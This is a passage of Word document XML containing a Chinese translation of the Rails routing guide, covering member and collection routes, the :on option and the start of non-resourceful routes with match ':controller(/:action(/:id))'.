              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="140BA90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如果你要指定对象的其他动作的话你也可以这样：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6096"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="03075C26" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E60CF8F" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1941135785"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>link_to "Edit Ad", [:edit, @magazine, @ad] %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4C66BDF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这样就能把你的模型和 URL 有效的结合起来了，而且这也是一个很棒很 Resourceful 的特性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C91EA33"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2.9 加入额外的 RESTful 行为</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24D2659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除了7个默认创建的 RESTful 路由之外，如果你喜欢，你可以将一些额外的路由应用到你的物件集合或者单个的物件下面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369135FE" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>2.9.1 成员(Member)路由</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD111B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加入一个成员路由只需要在你的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>resource</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 代码块中加入你一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>member</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 代码块就好：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2736"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="427F3116" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1EA1550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resources :photos</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2E4896C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member do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31CD664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get 'preview'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FDA642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6841E1C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248AEFC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这样将会把 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/1/preview</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 GET 动作识别出来，然后路由会匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PhotosController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制器下面的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>preview</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 行为中。它同样会建立两个Helper：</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>preview_photo_url</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>preview_photo_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011CCC5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当你使用了路由中的 Member 代码块时，你可以任意指定一个HTTP动词： </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>patch</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>put</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 或者 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>delete</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 。如果你并没有太多的 Member 路由规则，可以用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:on</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为后缀来把代码块替换掉：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4176"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4770453F" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="48D8819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resources :photos</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34F0897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get 'preview', :on</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :member</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AD5CEE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391D51FC" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>2.9.2 集合(Collection)路由</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34DF110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要想加入一个集合路由：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2616"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="284FA9CF" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C9E1E2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resources :photos</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08F69BE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collection do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77C6A9B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get 'search'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B6A3E1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55DD5D4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1332353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上面这段代码将会让 Rails 用 GET 方法匹配路径 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/search</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。并且这个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>search</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 行为将会匹配到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PhotosController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">下，它将会创建 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>search_photos_url</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>search_photos_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 两个路由Helper。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="082FDEE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同成员路由一样，你可以传入一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:on</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4536"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="56908ADC" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F87746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resources :photos</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7A8857A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get 'search', :on</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :collection</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B974DC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022C0E84" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>2.9.3 注意事项</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F35835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如果你发现自己对 Resourceful 路由加入了太多的额外规则，是时候停下来好好审视下你是不是应该创建另一个 resource。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72FC92F2"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3 非 Resourceful 路由</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9E45D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对于 Resourceful 的路由，Rails 有着一整套强大的路由和行为支持，即使如此，你有时候可能也会需要一些不是由 Rails 成组生成的路由，这时候，你就需要把规则手动地一个一个输入到你的应用中去了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78EB74D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虽然 Resourceful 的路由规则功能强大，但是在很多时候使用一个简单路由规则更为合适。如果你觉得简单路由规则更合适，你并没有必要把应用中的每个规则都往 Resourceful 框架上套。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BEF685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特别是在你为一个控制器添加上了新的行为的时候，添加一条简单路由规则往往更方便一些。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A8225C6"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3.1 相关参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DEFECE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当你为你的路由设置了一条规则的时候，你就需要提供一组符号字面量来让 Rails 能更好的识别并匹配收到的 HTTP 请求。其中有两个符号量尤其的特别：</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:controller</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 位置会匹配到你应用中名字对应的控制器，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:action</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 有匹配到你应用中对应的控制器中的行为。举个例子，下面这个默认的 Rails 路由规则：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4416"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5A1924FB" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="585F464F" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1708019725"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match ':controller(/:action(/:id))'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="11AC9AB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如果收到的请求是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/show/1</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> （前提是它还没有被其他的前面的路由规则匹配），那么按照这个规则 Rails 将会调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PhotosController</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制器中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
